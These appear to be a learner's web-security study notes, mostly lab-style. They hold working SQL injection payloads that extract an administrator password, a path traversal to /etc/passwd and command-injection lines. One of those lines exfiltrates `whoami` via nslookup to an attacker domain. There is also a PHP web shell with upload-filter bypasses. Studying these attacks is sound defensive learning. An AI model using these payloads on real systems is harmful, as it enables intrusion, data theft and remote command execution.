
## web security
### learn sql 
```
order of operations

 ( FROM, WHERE, GROUP BY, HAVING,SELECT,DISTNINT,UNION, ORDER BY, LIMIT
https://community.sisense.com/t5/knowledge/sql-order-of-operations/ta-p/8989
SELECT CustomerName, ContactName, Address
FROM Customers
WHERE Address IS NOT NULL;
The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns
' UNION SELECT NULL--: Here, you are injecting a UNION statement with a SELECT statement that returns a single column with a NULL value
oracle:::::::::
' UNION SELECT NULL FROM DUAL--

. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment
```
```
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
The Information Schema COLUMNS table provides information about columns in each table on the server.

https://mariadb.com/kb/en/information-schema-columns-table
all_tables in oracle data base
we always need to specify from for queries of oracle database (we can use table 'dual')
structure of oracle all_Tables
https://docs.oracle.com/cd/B13789_01/server.101/b10755/statviews_1190.htm

ALL_TAB_COLUMNS describes the columns of the tables, views, and clusters accessible to the current user.

https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html
```
### blind
```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
SUBSTRING(string_expression, start, length)

intruder in burp
https://sandunigfdo.medium.com/blind-sql-injection-with-conditional-responses-d23ff6660299
```
## 12-11-2034
### directory traversal
```
url encoding
double url encoding
....// so after one strip we get ../
if check happens whether it starts with given dir then use that dir then traverse back
if chekc happens whether file ends with given extension use null byte

a null byte to effectively terminate the file path before the required extension. For example:

filename=../../../etc/passwd%00.png
var/www/img
```
### os command injection
```
Purpose of command	Linux	Windows
Name of current user	whoami	whoami
Operating system	uname -a	ver
Network configuration	ifconfig	ipconfig /all
Network connections	netstat -an	netstat -an
Running processes	ps -ef	tasklist

->
productId=3 | whoami &storeId=1

email=x||ping+-c+10+127.0.0.1||
email=||whoami>/var/www/images/output.txt||
out of band techniques
blind os command injection with(out of band interaction,out of band data exfiltration)

& nslookup kgji2ohoyw.web-attacker.com &
This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected
(if our service provider provides us the dns server logs we can see whether nslookup happend or not
ctr+u to url encode


& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
wwwuser.kgji2ohoyw.web-attacker.com

command separtors=====/shell metacharcters
https://www.makeuseof.com/what-are-linux-metacharacters/
&
&&
|
||
just on unix(;,Newline (0x0a or \n)
Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.

```
#### File Redirection Metacharacters
```
For a better understanding of redirection in Bash, each process in Linux has file descriptors, known as standard input (stdin/0), standard output (stdout/1), and standard error (stderr/2). They determine the origin of the command input and decide where to send the output and error message
```
#### brace expansion meta char
```
touch {apple,cider,vinegar}.{fruit,liquid,sour}
touch {a,b,c}.{1,2,3}={a..c}.{1..3}

```
#### other
```
pipe:Connects command output as an input to the other command.:cat /etc/passwd | grep root
semi colon:Allows execution of sequential commands, one after the other.::cd /etc ; ls -la ; chmod +x /tmp/script.php
ampresand:Runs the processes or commands in the background.::find / -perm -u=s -type f &
circumflex ^:Matches any pattern that begins with the expression followed by ^::	
cd /etc/ssh ; ls | grep ^s

```
### access control
```
```

### redictions
```
Redirection loops
in order of precedence
http rediction


html redictions
https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
<head>
  <meta http-equiv="Refresh" content="0; URL=https://example.com/" />
</head>
javascript redicrion
window.location = "https://example.com/";

```
#### http headers
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
### file upload vulnerabilites
```
What is a MIME type?
A MIME type (also known as a Multipurpose Internet Mail Extension) is a standard that indicates the format of a fil
mime type type/subtype
https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types

MIME sniffing
In the absence of a MIME type, or in certain cases where browsers believe they are incorrect, browsers may perform MIME sniffing — guessing the correct MIME type by looking at the bytes of the resource.

Servers can prevent MIME sniffing by sending the X-Content-Type-Options heade
```

# 13-11-2023
```
<?php echo file_get_contents('/home/carlos/secret'); ?>in php.php

<?php echo system($_GET['command']); ?>
This script takes a command as a parameter from the URL query string using $_GET['command'] and then executes it using the system function. The system function in PHP is used to execute an external command and display the output.

GET /example/exploit.php?command=id HTTP/1.1

pdf multipart/form-data
application/x-www-form-url-encoded for baseic html forms

```
### example of a basic from submisstion
```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

```
he message body is split into separate parts for each of the form's inputs. Each part contains a Content-Disposition header, which provides some basic information about the input field it relates to. These individual parts may also contain their own Content-Type header, which tells the server the MIME type of the data that was submitted using this input.
->>>>>>>> Content-Type header matches an expected MIME type.
```
### web shell uplad via content type restriction bypass
```
application/x-php==>image/png
```
```
servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:

GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com


HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>


his kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.
```
### web shell upload via path traversal
```
```
### Insufficient blacklisting of dangerous file types
.php5, .shtml
### Overriding the server configuration
```
web shell upload via file extension blacklist bpass
before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their /etc/apache2/apache2.conf file:

LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php

 Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is present.

similarly, developers can make directory-specific configuration on IIS servers using a web.config file.
AddType application/x-httpd-php .l33t
treet/process files with extension .133t as php
```
### apache special
```
Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is presen
https://cets.seas.upenn.edu/answers/addtype.
AddType application/x-httpd-php .l33t
```
### obfuscating file extensions
![image](https://github.com/radha-m0wn1ka/radha-m0wn1ka.github.io/assets/64199052/b3e5ca32-1b78-4293-9dbd-334ab629cc9f)
exploit.p.phphp
### polygot images
```
What is a polyglot? Just like PNG, JPEG, and DOC are valid file types, polyglots are a combination of two different file types. For example Phar + JPEG (PHP archive and JPEG file), GIFAR (Gif and Rar file) Javascript + JPEG, etc
```

